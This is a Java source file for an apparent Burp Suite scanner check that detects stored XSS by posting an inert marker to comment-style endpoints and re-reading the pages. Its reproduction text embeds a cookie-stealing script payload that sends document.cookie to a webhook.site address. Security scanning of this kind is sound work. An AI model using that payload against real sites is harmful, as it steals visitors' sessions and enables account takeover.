package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;

/**
 * Tests for STORED XSS: sends a payload tagged with a unique ID to typical
 * user-generated-content endpoints (comment, feedback, forum/guestbook post),
 * then looks for that marker again in a SECOND request (GET on the same
 * endpoint and on the application home page) — i.e. confirms the data was
 * persisted and is served without sanitization to ANY visitor, not just the
 * one who sent it.
 *
 * This is more significant than reflected XSS: it indicates the payload is
 * saved in the database and can reach other users (including admins) with no interaction.
 *
 * Created by Rx0 - @rodrigocoutinho91
 */
public class StoredXssCheck implements VulnCheck {

    private static final String[] WRITE_ENDPOINTS = {
            "/api/comments", "/api/v1/comments", "/comments",
            "/api/feedback", "/api/guestbook", "/api/posts", "/api/reviews"
    };

    @Override
    public String name() {
        return "Stored XSS";
    }

    @Override
    public List<Finding> execute(MontoyaApi api, String baseUrl) {
        List<Finding> findings = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        for (String path : WRITE_ENDPOINTS) {
            try {
                String marker = "rx0stored" + (System.currentTimeMillis() % 1000000);
                String payload = "<rx0xss>" + marker + "</rx0xss>";
                String requestBody = "{\"comment\":\"" + payload + "\",\"message\":\"" + payload
                        + "\",\"name\":\"RxTest\",\"content\":\"" + payload + "\",\"text\":\"" + payload + "\"}";

                HttpRequest writeReq = HttpRequest.httpRequestFromUrl(base + path)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/json")
                        .withBody(requestBody);
                HttpResponse writeResp = api.http().sendRequest(writeReq).response();
                if (writeResp == null || writeResp.statusCode() >= 400) continue;

                // If the POST itself already echoes without escaping, it's at least reflected —
                // but what really matters here is re-reading it in a NEW request.
                boolean confirmedOnRewrite = findMarkerAt(api, base + path, payload);
                boolean confirmedOnHome = findMarkerAt(api, base + "/", payload);

                if (confirmedOnRewrite || confirmedOnHome) {
                    String confirmedWhere = confirmedOnRewrite ? (base + path) : (base + "/");
                    findings.add(new Finding(
                            "Possible stored XSS via " + path,
                            Severity.CRITICAL,
                            confirmedWhere,
                            "A test payload was sent via POST to '" + path + "' and, in a SEPARATE, later GET request, " +
                                    "the same payload came back without escaping — i.e. the data was persisted and is served " +
                                    "to any visitor of the page without sanitization. This is more severe than reflected XSS, since " +
                                    "it does not depend on tricking the victim into clicking a malicious link.",
                            "Payload sent: " + payload + " | Confirmed at: " + confirmedWhere,
                            "Sanitize/escape all user-generated content before storing it OR before rendering it (ideally " +
                                    "both), and implement CSP as defense in depth.",
                            "1) Resend the same POST to '" + base + path + "' swapping the test payload for a real PoC, e.g.: " +
                                    "<script>fetch('https://webhook.site/YOUR-ID?c='+document.cookie)</script> in the comment/message field. " +
                                    "2) Access '" + confirmedWhere + "' with another session/browser (simulating another user/admin visiting the page) " +
                                    "and confirm the script runs automatically, with no victim interaction required. 3) This demonstrates that " +
                                    "the payload reaches ANY visitor — including administrators, which can lead to account takeover."));
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Error in stored XSS check (" + path + "): " + e.getMessage());
            }
        }
        return findings;
    }

    private boolean findMarkerAt(MontoyaApi api, String url, String payload) {
        try {
            HttpRequest readReq = HttpRequest.httpRequestFromUrl(url);
            HttpResponse readResp = api.http().sendRequest(readReq).response();
            if (readResp == null) return false;
            String body = readResp.bodyToString();
            return body != null && body.contains(payload);
        } catch (Exception e) {
            return false;
        }
    }
}
